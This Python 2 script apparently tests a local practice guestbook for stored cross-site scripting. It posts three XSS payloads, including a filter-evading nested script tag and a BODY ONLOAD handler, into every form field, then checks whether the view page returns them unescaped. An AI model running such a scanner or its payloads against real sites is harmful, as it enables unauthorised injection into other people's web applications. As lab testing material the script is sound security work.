import requests
import sys
from bs4 import BeautifulSoup, SoupStrainer


url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
payloads = ['<script>alert(1);</script>','<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
initial = requests.get(url)
for payload in payloads:
    d = {}
    for field in BeautifulSoup(initial.text,
        parse_only=SoupStrainer('input')):
        if field.has_attr('name'):
            if field['name'].lower() == "submit":
                d[field['name']] = "submit"
            else:
                d[field['name']] = payload
    req = requests.post(url2, data=d)
    checkresult = requests.get(url3)

    if payload in checkresult.text:
        print "Full string returned"
        print "Attack string: "+ payload